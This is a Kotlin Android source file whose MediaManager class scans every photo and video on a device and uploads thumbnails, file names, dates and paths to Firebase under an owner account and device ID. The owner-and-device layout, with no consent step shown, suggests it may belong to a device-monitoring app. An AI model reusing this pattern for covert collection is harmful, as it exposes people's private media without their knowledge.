package com.partypark.app

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.media.ThumbnailUtils
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import android.util.Size
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import java.io.ByteArrayOutputStream
import java.util.UUID

class MediaManager(private val context: Context) {

    private val storage = Firebase.storage.reference
    private val database = Firebase.database.reference

    fun scanAndUploadMedia(ownerUid: String, deviceId: String, onComplete: (Int) -> Unit = {}) {
        Thread {
            try {
                val photos = queryMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image")
                val videos = queryMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video")

                val all = photos + videos
                var uploaded = 0

                all.forEach { item ->
                    try {
                        val thumbBytes = createThumbnail(item.uri, item.type)
                        if (thumbBytes != null) {
                            val thumbPath = "media/$deviceId/${item.id}_thumb.jpg"
                            val thumbRef = storage.child(thumbPath)

                            thumbRef.putBytes(thumbBytes).continueWithTask { task ->
                                if (!task.isSuccessful) throw task.exception!!
                                thumbRef.downloadUrl
                            }.addOnSuccessListener { uri ->
                                val data = mapOf(
                                    "id" to item.id,
                                    "name" to item.name,
                                    "type" to item.type,
                                    "size" to item.size,
                                    "duration" to item.duration,
                                    "date" to item.date,
                                    "thumbnail" to uri.toString(),
                                    "path" to item.path
                                )
                                database.child("users").child(ownerUid).child("devices").child(deviceId)
                                    .child("media").child(item.id).setValue(data)
                            }
                            uploaded++
                        }
                    } catch (e: Exception) {
                        Log.e("MediaManager", "Failed to process ${item.name}", e)
                    }
                }

                onComplete(uploaded)
            } catch (e: Exception) {
                Log.e("MediaManager", "Scan failed", e)
                onComplete(0)
            }
        }.start()
    }

    private fun queryMedia(uri: android.net.Uri, type: String): List<MediaItem> {
        val items = mutableListOf<MediaItem>()
        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_ADDED,
            MediaStore.MediaColumns.DATA
        )

        val durationCol = if (type == "video") MediaStore.Video.Media.DURATION else null

        context.contentResolver.query(uri, projection + (durationCol?.let { arrayOf(it) } ?: emptyArray()), null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
            val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
            val dateCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
            val pathCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
            val durCol = durationCol?.let { cursor.getColumnIndexOrThrow(it) }

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol).toString()
                val name = cursor.getString(nameCol) ?: "unknown"
                val size = cursor.getLong(sizeCol)
                val date = cursor.getLong(dateCol) * 1000
                val path = cursor.getString(pathCol) ?: ""
                val duration = durCol?.let { cursor.getLong(it) } ?: 0L
                val contentUri = ContentUris.withAppendedId(uri, id.toLong())

                items.add(MediaItem(id, name, type, size, duration, date, path, contentUri))
            }
        }
        return items
    }

    private fun createThumbnail(uri: android.net.Uri, type: String): ByteArray? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(uri, Size(200, 200), null)
            } else {
                null
            } ?: return null

            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
            stream.toByteArray()
        } catch (e: Exception) {
            Log.e("MediaManager", "Thumbnail failed", e)
            null
        }
    }

    data class MediaItem(
        val id: String,
        val name: String,
        val type: String,
        val size: Long,
        val duration: Long,
        val date: Long,
        val path: String,
        val uri: android.net.Uri
    )
}